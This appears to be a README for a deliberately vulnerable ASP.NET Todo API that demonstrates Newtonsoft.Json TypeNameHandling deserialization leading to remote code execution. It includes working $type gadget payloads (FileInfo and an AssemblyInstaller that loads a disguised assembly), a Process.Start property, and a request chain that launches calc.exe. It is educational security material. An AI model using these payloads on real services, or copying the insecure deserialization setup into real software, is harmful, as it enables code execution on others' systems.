# Introduction

This project demonstrates serialization vulnerabilities using Newtonsoft.Json and BinarySerialization. The Todo project is baseed on the starter tutorial available here:

[Create a controller based API](https://learn.microsoft.com/en-us/aspnet/core/tutorials/first-web-api?view=aspnetcore-7.0&tabs=visual-studio)

These examples were assembled based on serialization vulnerabilities highlighted in the [ysoserial.net](https://github.com/pwntester/ysoserial.net) git repo. This example reproduces a remote code execution vulnerability by exploiting the Newtonsoft.Json serializer. 

The [TypeNameHandling property](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm) exposes a deserialization vulnerability then the value is set to anything other than _None_. This informs the deserialization process to resolve a type using the _$type_ property.
``` JSON
{
    "$type": "System.IO.FileInfo, System.IO.FileSystem",
    "fileName": "rce-test.txt"
}
```
This example creates a _System.IO.FIleINfo_ instance and set the _FIleName_ property to "rce_test.txt." This could potentially be used to exfiltrate file information on the host environment. The examples in this repo make use of a generic dictionary to pass malicious payloads. The _TodItem_ class has twp vulnerabile properties. _Metadata_ accepts a _Dictionary<string, object>_ and _BinaryMetadata_ accepts a class that uses a _BinaryFormatter_.

``` C#
public class TodoItem
{
    public long Id { get; set; }
    public string? Name { get; set; }
    public bool IsComplete { get; set; }

    public Dictionary<string, object>? Metadata { get; set;}
    public List<MetadataItem>? BinaryMetadata { get; set; }
}

```

This can be exploited using the following message:

``` JSON
{
  "name": "walk dog1",
  "isComplete": true,
  "metadata":
    {
        "data2": {
		   "$type": "System.IO.FileInfo, System.IO.FileSystem",
		   "fileName": "rce-test.txt"
	     }
    }
}
```
# How to Reproduce

This project uses a simple ToDo REST API to demonstrate this JSON RCE vulnerability. The MaliciousAssembly project includes this property which calls _Process.Start_ using the property value.

``` C#
public string ProcessLaunch
{
    get
    {
        return processName;
    }
    set
    {
        processName = value;
        Process.Start(value);
    }
}
```

## Upload malicious file

During complication, this assembly is placed in the bin directory of the ToDo web api with the file name _someimage.png_. This substitutes for a REST API with a file upload endpoint. In a production environment, this could be placed in Azure Blob storage and referenced by a URL.

## Load the malicious file

The first REST API call loads the malicious file using:

``` JSON
POST https://localhost:7040/api/TodoItems HTTP/1.1
content-type: application/json

{
  "name": "load assembly",
  "isComplete": true,
  "metadata":
    {
        "data2":  {"$type":"System.Configuration.Install.AssemblyInstaller, 
            System.Configuration.Install",
            "Path":"someimage.png"}
    }
}
```
The _Path_ is local; however, in a production environment, it could be loaded from a temporary directory or another local directory.

## Invoke the Malicious Property

Now that the Assembly is in the AppDomain, the ProcessLaunch property can be invoked:

``` JSON 
POST https://localhost:7040/api/TodoItems HTTP/1.1
content-type: application/json

{
  "name": "launch calc",
  "isComplete": true,
  "metadata":
    {
        "launchdata":  
           { "$type":"MaliciousAssembly.ProcessStarter, MaliciousAssembly",
             "ProcessLaunch":"calc.exe" }
    }
}
```

These calls are available in the _todo-badpath.http_ file. Running these examples in Visual Studio Code requires the [REST Client](https://marketplace.visualstudio.com/items?itemName=humao.rest-client) extension.

## JSON Vunlnerability

The JSON vulnerability is exposed in Newtonsoft.Json through the use of `TypeNameResolver.`

With .NET 6+ it is not possible to override the default JSON serializer from System.Text.Json when using minimal APIs. See [Minimal APIs quick reference](https://learn.microsoft.com/en-us/aspnet/core/fundamentals/minimal-apis?view=aspnetcore-6.0#configure-json-deserialization-options-for-body-binding).

